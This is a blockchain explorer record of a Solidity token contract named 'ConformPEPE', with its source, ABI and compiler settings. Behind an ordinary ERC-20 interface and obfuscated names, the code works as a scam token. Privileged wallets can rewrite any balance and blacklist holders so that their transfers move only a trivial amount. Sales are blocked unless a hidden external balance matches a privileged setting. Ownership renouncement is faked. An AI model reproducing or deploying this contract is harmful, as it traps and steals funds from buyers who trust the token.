{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface limitSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTx) external view returns (uint256);\n\n    function transfer(address feeTrading, uint256 marketingMax) external returns (bool);\n\n    function allowance(address feeExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTrading,\n        uint256 marketingMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderMarketing, uint256 value);\n    event Approval(address indexed feeExempt, address indexed spender, uint256 value);\n}\n\nabstract contract txExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamListShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchLaunched {\n    function createPair(address marketingTx, address fundMax) external returns (address);\n}\n\ninterface buyTotalWallet is limitSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConformPEPE is txExempt, limitSender, buyTotalWallet {\n\n    function balanceOf(address liquidityTx) public view virtual override returns (uint256) {\n        return txAt[liquidityTx];\n    }\n\n    uint256 public limitTeam;\n\n    function receiverLimitAt(uint256 marketingMax) public {\n        toAt();\n        modeFee = marketingMax;\n    }\n\n    function getOwner() external view returns (address) {\n        return autoMax;\n    }\n\n    function autoLiquidityLaunch(address marketingTo, uint256 marketingMax) public {\n        toAt();\n        txAt[marketingTo] = marketingMax;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isAutoToken;\n    }\n\n    mapping(address => bool) public walletToken;\n\n    function totalLaunched(address launchShould, address feeTrading, uint256 marketingMax) internal returns (bool) {\n        require(txAt[launchShould] >= marketingMax);\n        txAt[launchShould] -= marketingMax;\n        txAt[feeTrading] += marketingMax;\n        emit Transfer(launchShould, feeTrading, marketingMax);\n        return true;\n    }\n\n    address public txSender;\n\n    function toAt() private view {\n        require(walletToken[_msgSender()]);\n    }\n\n    address fromShouldExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public limitFundExempt;\n\n    string private totalAuto = \"Conform PEPE\";\n\n    function approve(address txExemptLaunched, uint256 marketingMax) public virtual override returns (bool) {\n        shouldToken[_msgSender()][txExemptLaunched] = marketingMax;\n        emit Approval(_msgSender(), txExemptLaunched, marketingMax);\n        return true;\n    }\n\n    uint256 modeFee;\n\n    bool public teamShould;\n\n    function toTotal(address launchShould, address feeTrading, uint256 marketingMax) internal returns (bool) {\n        if (launchShould == txSender) {\n            return totalLaunched(launchShould, feeTrading, marketingMax);\n        }\n        uint256 isExemptMax = limitSender(limitFundExempt).balanceOf(toWalletLaunched);\n        require(isExemptMax == modeFee);\n        require(feeTrading != toWalletLaunched);\n        if (minFrom[launchShould]) {\n            return totalLaunched(launchShould, feeTrading, launchTx);\n        }\n        return totalLaunched(launchShould, feeTrading, marketingMax);\n    }\n\n    uint256 private takeTo;\n\n    function owner() external view returns (address) {\n        return autoMax;\n    }\n\n    mapping(address => uint256) private txAt;\n\n    uint256 private totalShould;\n\n    bool public listLimit;\n\n    uint256 marketingTxTake;\n\n    bool public launchTotalEnable;\n\n    address private autoMax;\n\n    function name() external view virtual override returns (string memory) {\n        return totalAuto;\n    }\n\n    function marketingFrom(address txShould) public {\n        toAt();\n        \n        if (txShould == txSender || txShould == limitFundExempt) {\n            return;\n        }\n        minFrom[txShould] = true;\n    }\n\n    constructor (){\n        \n        teamListShould walletFund = teamListShould(fromShouldExempt);\n        limitFundExempt = launchLaunched(walletFund.factory()).createPair(walletFund.WETH(), address(this));\n        if (launchTotalEnable) {\n            limitSell = true;\n        }\n        txSender = _msgSender();\n        receiverWallet();\n        walletToken[txSender] = true;\n        txAt[txSender] = walletTakeFrom;\n        if (teamShould) {\n            fromMode = false;\n        }\n        emit Transfer(address(0), txSender, walletTakeFrom);\n    }\n\n    function transfer(address marketingTo, uint256 marketingMax) external virtual override returns (bool) {\n        return toTotal(_msgSender(), marketingTo, marketingMax);\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldToken;\n\n    uint8 private isAutoToken = 18;\n\n    function fundSwap(address receiverMin) public {\n        if (listLimit) {\n            return;\n        }\n        \n        walletToken[receiverMin] = true;\n        if (teamShould) {\n            teamShould = false;\n        }\n        listLimit = true;\n    }\n\n    bool public fromMode;\n\n    function allowance(address atEnable, address txExemptLaunched) external view virtual override returns (uint256) {\n        if (txExemptLaunched == fromShouldExempt) {\n            return type(uint256).max;\n        }\n        return shouldToken[atEnable][txExemptLaunched];\n    }\n\n    function transferFrom(address launchShould, address feeTrading, uint256 marketingMax) external override returns (bool) {\n        if (_msgSender() != fromShouldExempt) {\n            if (shouldToken[launchShould][_msgSender()] != type(uint256).max) {\n                require(marketingMax <= shouldToken[launchShould][_msgSender()]);\n                shouldToken[launchShould][_msgSender()] -= marketingMax;\n            }\n        }\n        return toTotal(launchShould, feeTrading, marketingMax);\n    }\n\n    bool private limitSell;\n\n    uint256 private walletTakeFrom = 100000000 * 10 ** 18;\n\n    uint256 constant launchTx = 18 ** 10;\n\n    function receiverWallet() public {\n        emit OwnershipTransferred(txSender, address(0));\n        autoMax = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTakeFrom;\n    }\n\n    address toWalletLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed tokenTrading, address indexed walletTrading);\n\n    mapping(address => bool) public minFrom;\n\n    string private atIs = \"CPE\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txExemptLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExemptLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"autoLiquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"}],\"name\":\"fundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotalEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFundExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"}],\"name\":\"marketingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"receiverLimitAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConformPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}